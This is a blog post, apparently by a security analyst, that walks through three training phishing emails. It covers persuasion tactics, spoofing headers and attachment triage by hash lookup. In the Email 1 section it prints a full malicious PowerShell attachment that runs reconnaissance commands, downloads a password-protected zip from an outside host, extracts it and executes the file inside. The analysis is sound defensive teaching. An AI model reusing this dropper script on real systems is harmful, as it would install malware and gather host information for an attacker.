<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Phishing Email Analysis | üç† yamsbot</title>
<meta name="keywords" content="">
<meta name="description" content="What is a phishing email?
In my words, a phishing email, or phish in general, is an attackers attempt to persuade the victim user into doing some action. This could be anything, but typically attackers are looking to persuade the victim into:

Purchasing something for the attacker
Navigate to a malicious website
Disclose information
Download and run an application

How do attackers persuade victims?
Think back to primary school. At least in my case, this was my first exposure to what is called the &ldquo;rhetorical triangle&rdquo;. The rhetorical triangle consists of the three rhetoritcal devices:">
<meta name="author" content="">
<link rel="canonical" href="https://yamsbot.github.io/random/phishingemails/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.1d79e034ed3fae3cce466e1b13b697315f9998d1ba8d908def178611b372b49f.css" integrity="sha256-HXngNO0/rjzORm4bE7aXMV&#43;ZmNG6jZCN7xeGEbNytJ8=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://yamsbot.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://yamsbot.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://yamsbot.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://yamsbot.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://yamsbot.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://yamsbot.github.io/random/phishingemails/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://yamsbot.github.io/" accesskey="h" title="üç† yamsbot (Alt + H)">üç† yamsbot</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://yamsbot.github.io/about/" title="about">
                    <span>about</span>
                </a>
            </li>
            <li>
                <a href="https://yamsbot.github.io/writeups/" title="writeups">
                    <span>writeups</span>
                </a>
            </li>
            <li>
                <a href="https://yamsbot.github.io/research/" title="research">
                    <span>research</span>
                </a>
            </li>
            <li>
                <a href="https://yamsbot.github.io/random/" title="random">
                    <span>random</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Phishing Email Analysis
    </h1>
    <div class="post-meta"><span title='2025-01-28 13:28:56 -0500 EST'>January 28, 2025</span>&nbsp;¬∑&nbsp;6 min&nbsp;¬∑&nbsp;1134 words

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#what-is-a-phishing-email" aria-label="What is a phishing email?">What is a phishing email?</a></li>
                <li>
                    <a href="#how-do-attackers-persuade-victims" aria-label="How do attackers persuade victims?">How do attackers persuade victims?</a><ul>
                        
                <li>
                    <a href="#ethos" aria-label="Ethos">Ethos</a></li>
                <li>
                    <a href="#pathos" aria-label="Pathos">Pathos</a></li>
                <li>
                    <a href="#logos" aria-label="Logos">Logos</a></li></ul>
                </li>
                <li>
                    <a href="#email-spoofing" aria-label="Email Spoofing">Email Spoofing</a></li>
                <li>
                    <a href="#email-phishing" aria-label="Email phishing">Email phishing</a><ul>
                        
                <li>
                    <a href="#email-1" aria-label="Email 1">Email 1</a><ul>
                        
                <li>
                    <a href="#inspection" aria-label="Inspection">Inspection</a></li>
                <li>
                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li></ul>
                </li>
                <li>
                    <a href="#email-2" aria-label="Email 2">Email 2</a><ul>
                        
                <li>
                    <a href="#inspection-1" aria-label="Inspection">Inspection</a></li>
                <li>
                    <a href="#conclusion-1" aria-label="Conclusion">Conclusion</a></li></ul>
                </li>
                <li>
                    <a href="#email-3" aria-label="Email 3">Email 3</a><ul>
                        
                <li>
                    <a href="#conclusion-2" aria-label="Conclusion">Conclusion</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="what-is-a-phishing-email">What is a phishing email?<a hidden class="anchor" aria-hidden="true" href="#what-is-a-phishing-email">#</a></h2>
<p>In my words, a phishing email, or phish in general, is an attackers attempt to persuade the victim user into doing some action. This could be anything, but typically attackers are looking to persuade the victim into:</p>
<ul>
<li>Purchasing something for the attacker</li>
<li>Navigate to a malicious website</li>
<li>Disclose information</li>
<li>Download and run an application</li>
</ul>
<h2 id="how-do-attackers-persuade-victims">How do attackers persuade victims?<a hidden class="anchor" aria-hidden="true" href="#how-do-attackers-persuade-victims">#</a></h2>
<p>Think back to primary school. At least in my case, this was my first exposure to what is called the &ldquo;rhetorical triangle&rdquo;. The rhetorical triangle consists of the three rhetoritcal devices:</p>
<ul>
<li>Ethos</li>
<li>Pathos</li>
<li>Logos</li>
</ul>
<h3 id="ethos">Ethos<a hidden class="anchor" aria-hidden="true" href="#ethos">#</a></h3>
<p>If you are not familiar, Ethos is an appeal to an authority. In the case of phishing, the attacker could be acting as if they are the victims manager, CEO, etc,. The attacker will establish some sort of credibility that convinces you to take some action. An example I have seen before is:</p>
<p>&ldquo;Hey [name], its me [CEOs name]. I am out and forgot my credit card, can you buy [gift card] and send me the details?&rdquo;</p>
<p>There are many iterations of this, but you get the idea. The victim reads that this messages is in fact coming from there CEO, establishing authority, so the victim must comply.</p>
<h3 id="pathos">Pathos<a hidden class="anchor" aria-hidden="true" href="#pathos">#</a></h3>
<p>Pathos is an appeal to emotions. This means that the goal is to tear at the victims emotions to persuade them into taking some action. If you have ever seen a commercial on TV where there are a ton of puppies in a shelter. They say, all these puppies will DIE if YOU don&rsquo;t donate money to keep them alive. &ldquo;We NEED you to help give these puppies a safe home.&rdquo; This is pathos at play. The victim feels bad, and emotions are strong, persuading the victim into donating money to save the puppies.</p>
<p>Another often exploited aspect of pathos is the sense of urgency. Attackers will include that this action must be taken now. Or this is a very urgent matter! Anything along those lines. This makes the victim think there is no time to investigate the claims; they need to act now.</p>
<h3 id="logos">Logos<a hidden class="anchor" aria-hidden="true" href="#logos">#</a></h3>
<p>Logos is the appeal to logic. The attacker uses clear reasoning, has a logically sound background story with no holes. Typically this is information backed by facts. In the case of phishing specifically, this may be seen in targeted phishing; aka Spear Phishing. There are an infinite amount of possibilities for a spear phish, but the key aspect is that they will be very convincing with the information that is presented.</p>
<h2 id="email-spoofing">Email Spoofing<a hidden class="anchor" aria-hidden="true" href="#email-spoofing">#</a></h2>
<p>Motivated attackers will oftentimes go a step further and incorporate email spoofing with their phishing campaigns. Fear not, as skilled security professionals we can identify these spoofing attempts. To determine if an email is spoofed we need to examine the email headers. Before this, lets go over the terminology/services we need to understand.</p>
<ul>
<li>DNS: Domain Name System</li>
<li>SMTP: Simple Mail Transfer Protocol</li>
<li>DMARC: Domain-based Message Authentication, Reporting, and Conformance</li>
<li>ARC: Authenticated Received Chain
<ul>
<li>Relevant headers:
<ol>
<li>ARC-Authentication-Results</li>
<li>ARC-Seal</li>
<li>ARC-Message-Signature</li>
</ol>
</li>
</ul>
</li>
<li>SPF: Sender Policy Framework
<ul>
<li>Relevant headers:
<ol>
<li>Received-SPF</li>
</ol>
</li>
</ul>
</li>
<li>DKIM: DomainKeys Identified Mail
<ul>
<li>Relevant headers:
<ol>
<li>DKIM-Signature</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>These technologies are important for email analysis because together they will determine if an email is authentic. These technologies will show in their respective headers if the email passes the checks established. For example, if the header <code>Received-SPF</code> displays &ldquo;Fail&rdquo;, this means that the email sent originates from a different IP address than what was listed in the SPF record.</p>
<p>Other relevant headers to check include:</p>
<ul>
<li>Received</li>
<li>Authentication-Results</li>
<li>From</li>
<li>Return-Path</li>
</ul>
<p>In cases where these headers do not align, the email could have been spoofed.</p>
<h2 id="email-phishing">Email phishing<a hidden class="anchor" aria-hidden="true" href="#email-phishing">#</a></h2>
<p>With all that out of the way, when we believe we have stumbled across and email phish; what do we do? What steps do we take to confirm the credibility of the sender?</p>
<p>First and foremost, what is the sender trying to accomplish? Think back to the list above.</p>
<p>We are going to look at some emails from <a href="https://letsdefend.io/">LetsDefend.io</a></p>
<h3 id="email-1">Email 1<a hidden class="anchor" aria-hidden="true" href="#email-1">#</a></h3>
<p><img loading="lazy" src="/images/phishingemails/email_001.png"></p>
<p>Analysing the email we can see the ethos at play.</p>
<ul>
<li>&ldquo;important update&rdquo;</li>
<li>&ldquo;enhance performance and security&rdquo;</li>
<li>&ldquo;it is crucial to perform this update&rdquo;</li>
</ul>
<p>We identify the action the sender wants the victim to take, in this case, download and run the attachment.</p>
<p>We should also look at where the email originated from: <code>appofficedrive.com</code></p>
<p>Already, this email is cleary a phishing attempt to get the victim to donwload and execute malware. Still, we can inspect the attachments for better confirm our suspicions.</p>
<h4 id="inspection">Inspection<a hidden class="anchor" aria-hidden="true" href="#inspection">#</a></h4>
<p>As the security professional you should have a quarantine environment to donwload and inspect these attachments.</p>
<p>Inspecting the attached powershell script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span>$dnsQuery = <span style="color:#e6db74">&#34;nslookup outlook.officebetas.com&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-Expression $dnsQuery
</span></span><span style="display:flex;"><span>ipconfig
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>ipconfig /all
</span></span><span style="display:flex;"><span>systeminfo
</span></span><span style="display:flex;"><span>Get-LocalGroupMember -Group Users
</span></span><span style="display:flex;"><span>Get-LocalGroupMember -Group Administrators
</span></span><span style="display:flex;"><span>$downloadUrl = <span style="color:#e6db74">&#34;https://files-ld.s3.us-east-2.amazonaws.com/denis.zip&#34;</span>
</span></span><span style="display:flex;"><span>$destination = <span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\Downloads\denis.zip&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri $downloadUrl -OutFile $destination
</span></span><span style="display:flex;"><span>$extractPath = <span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\Downloads\denis&#34;</span>
</span></span><span style="display:flex;"><span>$sevenZipPath = <span style="color:#e6db74">&#34;C:\Program Files\7-Zip\7z.exe&#34;</span>
</span></span><span style="display:flex;"><span>$password = <span style="color:#e6db74">&#34;infected&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">-Not</span> (Test-Path $extractPath)) {
</span></span><span style="display:flex;"><span>    New-Item -ItemType Directory -Path $extractPath
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$destination = <span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\Downloads\denis.zip&#34;</span>
</span></span><span style="display:flex;"><span>$extractArguments = <span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`&#34;</span>$destination<span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;-p</span>$password<span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;-o</span><span style="color:#ae81ff">`&#34;</span>$extractPath<span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;-y&#34;</span>
</span></span><span style="display:flex;"><span>Start-Process -FilePath $sevenZipPath -ArgumentList $extractArguments -Wait
</span></span><span style="display:flex;"><span>Start-Sleep -Seconds <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>$exePath = <span style="color:#e6db74">&#34;</span>$extractPath<span style="color:#e6db74">\denis.exe&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (Test-Path $exePath) {
</span></span><span style="display:flex;"><span>    Write-Host <span style="color:#e6db74">&#34;denis.exe found. Running...&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        Start-Process -FilePath $exePath -ErrorAction Stop
</span></span><span style="display:flex;"><span>        Write-Host <span style="color:#e6db74">&#34;denis.exe successfully executed.&#34;</span>
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>        Write-Host <span style="color:#e6db74">&#34;denis.exe could not be executed. Error: </span>$_<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    Write-Host <span style="color:#e6db74">&#34;denis.exe not found. Extracted directory: </span>$extractPath<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Script completed successfully.&#34;</span>
</span></span></code></pre></div><p>The script executes <code>nslookup outlook.officebetas.com</code>, a domain for us to investigate, followed by a download of <code>denis.zip</code>. The zip is then unpacked and the executable inside is executed.</p>
<p>Before we get too deep, this is just a phishing analysis so we wont reverse engineer the attachments, but what we will do is take some hashes and see if the file is known malware:</p>
<p><img loading="lazy" src="/images/phishingemails/email_001_denis.png"></p>
<p>If we put the sha256 hash into VirusTotal we can see that is without doubt not something we want to run: <a href="https://www.virustotal.com/gui/file/12c2c3566c29f80478277e0f96b79fc85b9e86ebf16505d8f2d7877a6204f860">virustotal link</a></p>
<h4 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h4>
<p>This is a phish. Delete delete delete.</p>
<h3 id="email-2">Email 2<a hidden class="anchor" aria-hidden="true" href="#email-2">#</a></h3>
<p><img loading="lazy" src="/images/phishingemails/email_002.png"></p>
<ul>
<li>Sense of urgency</li>
<li>Logical story (?)</li>
</ul>
<p>Almost, the hole here is: &ldquo;Why would I need to download a update package for Chrome, which has a built in package management system, in most instances automatically updating itself when critical vulnerabilities are patched?&rdquo;</p>
<p>Also, what is <code>resetlocations.com</code>?</p>
<p>These questions alone should cement this email as a phish.<br>
Lets download the attachment and check it out anyways :)</p>
<h4 id="inspection-1">Inspection<a hidden class="anchor" aria-hidden="true" href="#inspection-1">#</a></h4>
<p>The sha256sum returns as: <br>
<code>b5c571cbe24b37359eb4018bac19e37a2ffc6108d6d1cb5c8c22640397c47596</code></p>
<p>If we drop this into VirusTotal, 68/71 vendors detect this as malicious, labeled as <code>trojan.cosmicduke/miniduke</code>.</p>
<h4 id="conclusion-1">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion-1">#</a></h4>
<p>Phishing email. Delete delete delete.</p>
<h3 id="email-3">Email 3<a hidden class="anchor" aria-hidden="true" href="#email-3">#</a></h3>
<p><img loading="lazy" src="/images/phishingemails/email_003.png"></p>
<p>In this example we have a simple case of similiar domain to a real one. The difference being:
<code>letsdefwnd.io:letsdefend.io</code></p>
<p>The attacker attempts to get the end user to navigate to the malicious website using pathos, making the victim excited that they have received a free voucher to a website they may use often.</p>
<h4 id="conclusion-2">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion-2">#</a></h4>
<p>Phishing email. Delete delete delete.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Phishing Email Analysis on x"
            href="https://x.com/intent/tweet/?text=Phishing%20Email%20Analysis&amp;url=https%3a%2f%2fyamsbot.github.io%2frandom%2fphishingemails%2f&amp;hashtags=">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Phishing Email Analysis on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fyamsbot.github.io%2frandom%2fphishingemails%2f&amp;title=Phishing%20Email%20Analysis&amp;summary=Phishing%20Email%20Analysis&amp;source=https%3a%2f%2fyamsbot.github.io%2frandom%2fphishingemails%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://yamsbot.github.io/">üç† yamsbot</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
